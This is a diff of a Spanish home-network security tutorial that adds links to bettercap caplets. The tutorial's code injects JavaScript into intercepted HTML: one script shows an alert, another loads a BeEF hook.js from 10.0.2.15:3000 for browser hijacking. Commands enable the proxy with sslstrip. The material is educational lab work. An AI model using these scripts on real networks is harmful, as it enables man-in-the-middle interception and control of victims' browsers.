@@ -18,20 +18,20 @@ function onLoad(){
 }
 
 function onResponse(req,res){
- 
+
  if (res.ContentType.indexOf('text/html') == 0){
- 
+
  	var body = res.ReadBody();
- 
+
 	 res.Body = body.replace(
 	 '</head>',
 	 '<script type="text/javascript">alert(\"@cyberh99 wa    s here\")</script></head>'
 	 );
 	}
- 
-}        
+
+}
 ```
-[injectionJS.js]()
+[injectionJS.js](https://github.com/cyberh99/Seguridad-en-redes-dom-sticas/blob/master/scripts/capplets/injectionJS.js)
 
 Este código Javascript realiza una acción muy sencilla, se encarga de reemplazar la etiqueta _head_ del código html de cualquier página agregando una sencilla ventana que dice "@cyberh99 was here". Con esto podemos comprobar como funcionala inyección de Javascript.
 
@@ -53,7 +53,7 @@ http.proxy on
 https.proxy on
 
 ```
-[injectionTest.cap]()
+[injectionTest.cap](https://github.com/cyberh99/Seguridad-en-redes-dom-sticas/blob/master/scripts/capplets/injectionTest.cap)
 
 !!!warning
     Existen extensiones para los diferentes navegadores como Firefox y Google Chrome que permite deshabilitar Javascript de las diferentes páginas web, habilitando exclusivamente aquellos que sean de confianza.
@@ -77,15 +77,15 @@ function onResponse(req, res) {
     if( res.ContentType.indexOf('text/html') == 0 ){
         var body = res.ReadBody();
         if( body.indexOf('</head>') != -1 ) {
-            res.Body = body.replace( 
-                '</head>', 
-                '<script type="text/javascript" src="http://10.0.2.15:3000/hook.js"></script></head>' 
-            ); 
+            res.Body = body.replace(
+                '</head>',
+                '<script type="text/javascript" src="http://10.0.2.15:3000/hook.js"></script></head>'
+            );
         }
     }
 }
 ```
-[beefJavascript.js]()
+[beefJavascript.js](https://github.com/cyberh99/Seguridad-en-redes-dom-sticas/blob/master/scripts/capplets/beefJavascript.js)
 
 ```
 set http.proxy.script beefJavascript.js
@@ -97,7 +97,6 @@ set https.proxy.sslstrip true
 http.proxy on
 https.proxy on
 ```
-[beefInjection.cap]()
+[beefInjection.cap](https://github.com/cyberh99/Seguridad-en-redes-dom-sticas/blob/master/scripts/capplets/beefInjection.cap)
 
 Posteriormente disponemos de todo el potencial que nos ofrece beef para realizar acciones de post explotación.
-
